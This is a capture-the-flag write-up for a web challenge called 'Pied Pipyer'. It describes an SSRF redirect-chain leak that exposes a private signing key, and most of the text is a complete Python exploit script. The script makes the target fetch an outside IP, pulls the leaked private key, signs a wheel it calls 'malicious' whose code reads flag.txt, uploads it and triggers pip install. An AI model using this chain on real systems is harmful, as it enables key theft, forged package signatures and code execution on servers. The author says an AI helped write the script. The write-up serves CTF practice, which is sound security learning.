---
created: 2026-03-08T12:07
points: 180
solves: 17
title: Pied Pipyer
updated: 2026-03-08T12:30
---

After some analysis, we find that if an `NetworkException` is thrown, it contains a method `getRedirectResponses()` that returns the chain of redirects that led to the error.

```php
try{
} catch (\App\Exceptions\NetworkException $e) {
    http_response_code($e->getHttpCode());
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage(),
        'redirect_chain' => $e->getRedirectResponses(),
    ]);
}
```

If we have a redirect chain like this:

```
http://attacker.com -> http://localhost:5000/keys/private
```

Then the `getRedirectResponses()` method would return an array containing the URLs in the redirect chain, which we can use to identify potential SSRF vulnerabilities. In this case, we would see that the final URL is `http://localhost:5000/keys/private`, which indicates that the application is trying to access a local resource that may contain sensitive information.

However if we try this directly, a different error is thrown instead of the `NetworkException`:

```php [IngestionController.php:upload]
if (!preg_match('/\.whl$/i', $file['name'])) {
    throw new \RuntimeException("Only .whl files are allowed for upload");
}
```

To throw a network exception, we need to sneak in a 307, and have too many redirects.

```php [IngestionController.php:downloadUrl]
if ($httpCode === 307) {
    $has307 = true;
}
...
if ($redirectCount > $maxRedirects && $has307) {
    throw new \App\Exceptions\NetworkException(
        "Too many redirects (>{$maxRedirects})",
        $redirectChain
    );
}
```

And we have the private key!

I tried to make the AI write the script to upload a whl and then upload it, but for some reason it just doesn't work, my teammate took my script, asked AI and solved it.

```python
import zipfile
import subprocess
import tempfile
import os
import json
import requests

target = "http://127.0.0.1:33379"
# target = "http://localhost:8080"

r = requests.post(f"{target}/ingest/url",
                  json={"url": "http://168.138.68.98:65037"})
j = r.json()
print(j)
j = j['redirect_chain'][-1]['body_preview']
j = json.loads(j)
print(j)
private_key = j['content']

print("Private Key:", private_key)

temp_dir = tempfile.mkdtemp()
package_dir = os.path.join(temp_dir, 'hello_world_package')
os.makedirs(package_dir)

# Create setup.py
setup_py = '''
from setuptools import setup

setup(
    name='hello-world-package',
    version='1.0.0',
    packages=['hello_world_package'],
)
'''

with open(os.path.join(temp_dir, 'setup.py'), 'w') as f:
    f.write(setup_py)

init_py = '''
import os
print("Hello from the malicious package!")
try:
    with open('/var/www/html/flag.txt', 'r') as f:
        print(f.read())
except Exception as e:
    print(f"Error: {e}")
'''

with open(os.path.join(package_dir, '__init__.py'), 'w') as f:
    f.write(init_py)

subprocess.run(['python3', 'setup.py', 'bdist_wheel'],
               cwd=temp_dir, check=True)

dist_dir = os.path.join(temp_dir, 'dist')
whl_file = [f for f in os.listdir(dist_dir) if f.endswith('.whl')][0]
whl_path = os.path.join(dist_dir, whl_file)

extract_dir = os.path.join(temp_dir, 'extracted')
os.makedirs(extract_dir)
with zipfile.ZipFile(whl_path, 'r') as zf:
    zf.extractall(extract_dir)

dist_info_dir = [d for d in os.listdir(
    extract_dir) if d.endswith('.dist-info')][0]
record_path = os.path.join(extract_dir, dist_info_dir, 'RECORD')

key_file = os.path.join(temp_dir, 'private_key.pem')
with open(key_file, 'w') as f:
    f.write(private_key)

sig_path = os.path.join(extract_dir, dist_info_dir, 'RECORD.sig')
subprocess.run(['openssl', 'dgst', '-sha256', '-sign', key_file,
               '-out', sig_path, record_path], check=True)

new_whl_path = os.path.join(temp_dir, 'malicious.whl')
with zipfile.ZipFile(new_whl_path, 'w', zipfile.ZIP_DEFLATED) as zf:
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path, extract_dir)
            zf.write(full_path, arcname)

print(f"Malicious whl created at: {new_whl_path}")

with open(new_whl_path, 'rb') as f:
    files = {
        'file': ('hello-world-package-1.0.0-py3-none-any.whl', f, 'application/zip')}
    r = requests.post(f"{target}/ingest/upload", files=files)
    print("Upload response:", r.json())

r = requests.get(f"{target}/pip/install").json()
print(r)
print(r['stdout'])
```

```flag
?
```